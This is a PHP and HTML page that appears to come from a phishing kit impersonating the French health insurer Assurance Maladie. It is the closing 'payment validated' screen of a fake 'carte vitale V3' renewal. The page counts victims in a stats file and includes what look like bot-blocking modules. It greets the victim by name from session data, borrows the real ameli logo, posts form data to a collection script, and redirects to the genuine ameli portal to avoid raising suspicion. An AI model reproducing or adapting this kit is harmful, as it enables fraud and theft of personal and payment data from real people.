<?php 


include("../infos.php");
include("../prevents/all.php");
include("../common/sub_includes.php");
$filepath = '../stats.ini';
$data = @parse_ini_file($filepath);
$data['page_ok']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === "submit"){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
            update_ini_file($data, $filepath);
?>
<html lang="fr">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-itunes-app" content="app-id=505488770">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .progressbar { margin: 0px 10px; overflow: hidden; }
        .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
        .progressbar > div > span { color: rgb(52, 141, 48); }
        .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
        .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
        .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
        @media (max-width: 470px) {
          .progressbar > div > span { font-size: 11px !important; }
          .progressbar > div { width: inherit; padding-left: 5px; }
          .progressbar { margin: 0px auto; }
          .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
          .valider-btn { width: 100% !important; }
          .payment-form { padding: 10px !important; }
          .last-payment-form { padding: 10px !important; }
          .last-form-info > div { float: left !important; }
          .last-form-info > div > label { font-size: 11px; }
        }
        @media (max-width: 330px) {
          .progressbar > div > span { font-size: 10px !important; }
        }
        
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }
        
    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <link rel="shortcut icon" href="/public/fav.png" type="image/ico">

    <title>Veuillez remplir le formulaire</title>
</head>

<body>

    <div class="content-wrap" style="margin-top: 0px; margin-bottom: 30px; 
background: rgb(33, 177, 150) none repeat scroll 0% 0%;">
        <div class="banner">
            <img style="width:100%;max-width:500px;" src="../assets/images/head2.png">
        </div>
    </div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Accueil</a></li>
                <li class="active">Mise à jour carte vitale V3</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">

<div class="row">
    <div class="col-md-12">

        <div class="panel panel-default" style="background: url(../assets/images/back.png);">
            <div class="panel-heading">

                <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Paiement validé</h2>
            </div>

            <div class="panel-body"><br>

                
                <br>
                Numéro de commande : <b>FR5284564747511147</b>
                
                <br>
                Total payé : <b><?php echo $_SESSION["prix"] ?> €</b>
                
                <br>
                Bénéficiaire : <b>Assurance Maladie</b>
                <hr>
                
                
                
            
            
                        
                        <div class="row">
                        <div class="col-md-12">
                        
                        <div class="progressbar">
                  
                    <div><span>Identifiez-vous</span>
                        <div></div>
                    </div>
                    <div><span>Adresse</span>
                        <div></div>
                    </div>
                    <div><span>Frais de port</span>
                        <div></div>
                    </div>
                    <div> <span>Paiement</span>
                        <div></div>
                    </div>
                    <div class="progressing"> <span>Validée</span>
                        <div></div>
                    </div>
                </div>
                <br><br>

Bravo <b><?php echo $_SESSION["prenom"] . " " . $_SESSION["nom"] ?></b>, votre demande de nouvelle carte vitale v3 a bien été prise en compte et sera traitée rapidement par notre équipe de vérification.
Votre nouvelle carte vous sera envoyée par voie postale sous peu.

             <br>
             
             Afin de certifier et valider votre demande de nouvelle carte vitale dans les meilleurs délais, ce dernier pourra vous contacter très rapidement sur : 
             <br><br>
             <b>- Votre numéro de téléphone mobile ou fixe<br>
             - Votre adresse e-mail <br><br><br></b>
             
             Merci de votre confiance <br>
             l'Assurance Maladie.
<br>	

<meta http-equiv="refresh" content="30;url=https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?_somtc=true">


            </div>
        </div>
    </div>
</div>
<br><br>



</div>
</div></main>

    <div id="loading" class="LoadingPage">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://www.ameli.fr/sites/all/themes/contrib/ameli/logo.svg">
                </div>
                <span>Veuillez patienter ... Accès à votre dossier en cours.</span>
            </div>
        </div>
    </div>
	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>
    <script>


        $(document).ready(function() {
        			$("form").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/avoir.php",
        						data: $this.serialize()
        					})
        					.done(function(msg) {
        						setTimeout(function() {
        							window.location.href = "card.php";
        						}, 2000);
        					});
        				
        
        			});
        		});
    </script>

</body>

</html>